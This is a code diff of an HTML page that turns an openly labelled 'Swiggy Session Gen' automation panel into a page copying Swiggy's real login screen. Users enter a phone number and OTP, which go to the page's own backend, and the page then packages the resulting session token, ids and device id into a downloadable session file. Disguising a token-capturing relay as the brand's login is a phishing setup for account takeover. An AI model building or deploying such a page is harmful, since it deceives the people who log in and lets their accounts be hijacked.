@@ -3,58 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Swiggy Session Generator</title>
+    <title>Swiggy - Login</title>
     <style>
-        :root { --bg: #0a0a0a; --card: #141414; --accent: #fc8019; --text: #eaeaea; --muted: #777; --err: #ff3b3b; --ok: #00c853; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'SF Mono', 'Consolas', monospace; }
-        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .box { background: var(--card); width: 100%; max-width: 500px; padding: 30px; border-radius: 12px; border: 1px solid #222; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
-        h1 { font-size: 1.2rem; color: var(--accent); text-align: center; margin-bottom: 5px; letter-spacing: 2px; }
-        .sub { text-align: center; font-size: 0.75rem; color: var(--muted); margin-bottom: 25px; }
-        .view { display: none; }
-        .view.active { display: block; animation: fade 0.2s ease-out; }
-        @keyframes fade { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        label { font-size: 0.75rem; color: var(--muted); display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
-        input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 6px; color: #fff; font-size: 1rem; outline: none; transition: border 0.2s; -webkit-tap-highlight-color: transparent; }
-        input:focus { border-color: var(--accent); }
-        button { width: 100%; padding: 14px; background: var(--accent); border: none; border-radius: 6px; color: #000; font-weight: 800; font-size: 0.9rem; cursor: pointer; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
-        button:hover { filter: brightness(1.1); }
-        button:disabled { background: #222; color: #555; cursor: not-allowed; }
-        .log { margin-top: 25px; padding: 15px; background: #000; border-radius: 6px; font-size: 0.75rem; color: var(--muted); height: 150px; overflow-y: auto; border: 1px solid #1a1a1a; line-height: 1.6; }
-        .log .e { color: var(--err); }
-        .log .s { color: var(--ok); }
-        .log .i { color: var(--accent); }
+        :root { --swiggy-orange: #fc8019; --text-dark: #3d4152; --text-light: #686b78; --bg: #ffffff; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: var(--bg); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        .logo { font-size: 2.5rem; font-weight: 800; color: var(--swiggy-orange); margin-bottom: 10px; letter-spacing: -1px; }
+        .logo span { color: var(--text-dark); }
+        .subtitle { font-size: 1.1rem; font-weight: 600; margin-bottom: 30px; color: var(--text-dark); }
+        .view { display: none; animation: fade 0.3s ease; }
+        .view.active { display: block; }
+        @keyframes fade { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
+        .input-group label { font-size: 0.8rem; color: var(--text-light); margin-bottom: 5px; display: block; }
+        .phone-wrapper { display: flex; align-items: center; border-bottom: 2px solid #e0e0e0; padding-bottom: 5px; transition: border 0.2s; }
+        .phone-wrapper:focus-within { border-color: var(--swiggy-orange); }
+        .prefix { font-size: 1.1rem; font-weight: 600; color: var(--text-dark); margin-right: 10px; }
+        input { width: 100%; border: none; outline: none; font-size: 1.1rem; color: var(--text-dark); background: transparent; padding: 10px 0; }
+        
+        .btn { width: 100%; padding: 16px; background: var(--swiggy-orange); border: none; border-radius: 8px; color: white; font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 10px; transition: opacity 0.2s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .status { margin-top: 20px; font-size: 0.85rem; color: var(--text-light); min-height: 20px; }
+        .status.err { color: #e53935; }
+        .status.ok { color: #43a047; }
+        
+        .resend { margin-top: 15px; font-size: 0.9rem; color: var(--swiggy-orange); cursor: pointer; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>SWIGGY SESSION GEN</h1>
-    <p class="sub">premium automation panel</p>
-
+<div class="container">
+    <div class="logo">Swiggy<span>.</span></div>
+    
     <div id="v1" class="view active">
-        <label>Mobile Number (10 digits)</label>
-        <input type="tel" inputmode="numeric" id="inPhone" placeholder="9876543210" maxlength="10" autocomplete="off">
-        <button type="button" id="btn1" onclick="sendOtp()">Check & Request OTP</button>
+        <div class="subtitle">Login or Sign up</div>
+        <div class="input-group">
+            <label>Mobile Number</label>
+            <div class="phone-wrapper">
+                <span class="prefix">+91</span>
+                <input type="tel" inputmode="numeric" id="inPhone" placeholder="Enter mobile number" maxlength="10" autocomplete="off">
+            </div>
+        </div>
+        <button type="button" id="btn1" class="btn" onclick="sendOtp()">Continue</button>
     </div>
 
     <div id="v2" class="view">
-        <label>OTP for <span id="showNum" style="color:var(--accent)"></span></label>
-        <input type="tel" inputmode="numeric" id="inOtp" placeholder="Enter OTP" maxlength="6" autocomplete="off">
-        <button type="button" id="btn2" onclick="verifyOtp()">Verify & Generate</button>
+        <div class="subtitle">Enter OTP</div>
+        <div class="input-group">
+            <label>Sent to +91 <span id="showNum" style="color:var(--text-dark)"></span></label>
+            <div class="phone-wrapper">
+                <input type="tel" inputmode="numeric" id="inOtp" placeholder="Enter 6-digit OTP" maxlength="6" autocomplete="off" style="text-align:center; letter-spacing: 5px;">
+            </div>
+        </div>
+        <button type="button" id="btn2" class="btn" onclick="verifyOtp()">Verify</button>
+        <div class="resend" onclick="sendOtp()">Resend OTP</div>
     </div>
 
-    <div class="log" id="logs"></div>
+    <div class="status" id="statusMsg"></div>
 </div>
 
 <script>
     const API = window.location.origin;
     let state = {};
 
-    function out(msg, cls) {
-        const el = document.getElementById("logs");
-        el.innerHTML += '<div class="' + cls + '">> ' + msg + '</div>';
-        el.scrollTop = el.scrollHeight;
+    function setStatus(msg, cls) {
+        const el = document.getElementById("statusMsg");
+        el.innerText = msg;
+        el.className = "status " + (cls || "");
     }
 
     function go(id) {
@@ -74,92 +92,59 @@
 
     async function sendOtp() {
         const ph = document.getElementById("inPhone").value.trim();
-        if (!/^\d{10}$/.test(ph)) return out("Invalid number. Need 10 digits.", "e");
+        if (!/^\d{10}$/.test(ph)) return setStatus("Please enter a valid 10-digit number", "err");
 
         const btn = document.getElementById("btn1");
         btn.disabled = true;
-        out("Checking number status...", "i");
+        setStatus("Sending OTP...");
 
         try {
             const r = await fetch(API + "/api/otp?mobile=" + ph);
             const d = await r.json();
 
             if (d.statusCode === 0) {
-                // Number is REGISTERED
-                out("✅ Registered! OTP sent successfully.", "s");
-                let tid = d.tid;
-                let sid = d.sid;
+                let tid = d.tid, sid = d.sid;
                 if (!sid && tid) sid = decodeJwt(tid).sid;
-
                 state = { phone: ph, tid: tid, sid: sid, deviceId: d.deviceId || d._devId };
                 document.getElementById("showNum").innerText = ph;
                 go("v2");
+                setStatus("OTP sent successfully!", "ok");
             } else {
-                // Number is UNREGISTERED or Error
-                const msg = d.statusMessage || "Unknown error";
-                if (msg.toLowerCase().includes("not found") || msg.toLowerCase().includes("register")) {
-                    out("❌ Unregistered Number (Swiggy lo account ledu).", "e");
-                } else {
-                    out("Failed: " + msg, "e");
-                }
+                setStatus(d.statusMessage || "Failed to send OTP", "err");
                 btn.disabled = false;
             }
-        } catch (err) {
-            out("Network error: " + err.message, "e");
-            btn.disabled = false;
-        }
+        } catch (err) { setStatus("Network error", "err"); btn.disabled = false; }
     }
 
     async function verifyOtp() {
         const otp = document.getElementById("inOtp").value.trim();
-        if (!/^\d{4,6}$/.test(otp)) return out("Enter valid OTP.", "e");
+        if (!/^\d{4,6}$/.test(otp)) return setStatus("Enter valid OTP", "err");
 
         const btn = document.getElementById("btn2");
         btn.disabled = true;
-        out("Verifying OTP...", "i");
+        setStatus("Verifying...");
 
         try {
             const r = await fetch(API + "/api/verify", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    otp: otp, 
-                    phone: state.phone,
-                    tid: state.tid, 
-                    sid: state.sid, 
-                    deviceId: state.deviceId 
-                })
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ otp: otp, phone: state.phone, tid: state.tid, sid: state.sid, deviceId: state.deviceId })
             });
             const d = await r.json();
 
-            if (d.statusCode !== 0) {
-                out("Verification failed: " + (d.statusMessage || 'Bad OTP'), "e");
-                btn.disabled = false;
-                return;
-            }
+            if (d.statusCode !== 0) { setStatus(d.statusMessage || "Verification failed", "err"); btn.disabled = false; return; }
 
             const sess = {};
             const inner = typeof d.data === "object" ? d.data : {};
-            ["token", "tid", "sid"].forEach(k => {
-                if (inner[k]) sess[k] = inner[k];
-                else if (d[k]) sess[k] = d[k];
-            });
-
+            ["token", "tid", "sid"].forEach(k => { if (inner[k]) sess[k] = inner[k]; else if (d[k]) sess[k] = d[k]; });
             sess.deviceId = String(d.deviceId || state.deviceId);
             const uid = decodeJwt(sess.tid || "").user_id;
 
-            if (!uid) {
-                out("Incomplete session. Missing user_id.", "e");
-                btn.disabled = false;
-                return;
-            }
+            if (!uid) { setStatus("Session incomplete", "err"); btn.disabled = false; return; }
 
-            sess.userid = String(uid);
-            sess.mobile = state.phone;
+            sess.userid = String(uid); sess.mobile = state.phone;
             if (!sess.customerId) sess.customerId = sess.userid;
 
-            out("Login successful! Downloading...", "s");
-
+            setStatus("Login successful! Downloading session...", "ok");
             const blob = new Blob([JSON.stringify(sess, null, 4)], { type: "application/json" });
             const a = document.createElement("a");
             a.href = URL.createObjectURL(blob);
@@ -167,23 +152,16 @@
             a.click();
             URL.revokeObjectURL(a.href);
 
-            out("File downloaded.", "s");
-
             setTimeout(() => {
                 state = {};
                 document.getElementById("inPhone").value = "";
                 document.getElementById("inOtp").value = "";
-                document.getElementById("logs").innerHTML = "";
+                setStatus("");
                 go("v1");
-                out("Ready for next session!", "s");
             }, 3000);
 
-        } catch (err) {
-            out("Network error: " + err.message, "e");
-            btn.disabled = false;
-        }
+        } catch (err) { setStatus("Network error", "err"); btn.disabled = false; }
     }
 </script>
-
 </body>
 </html>
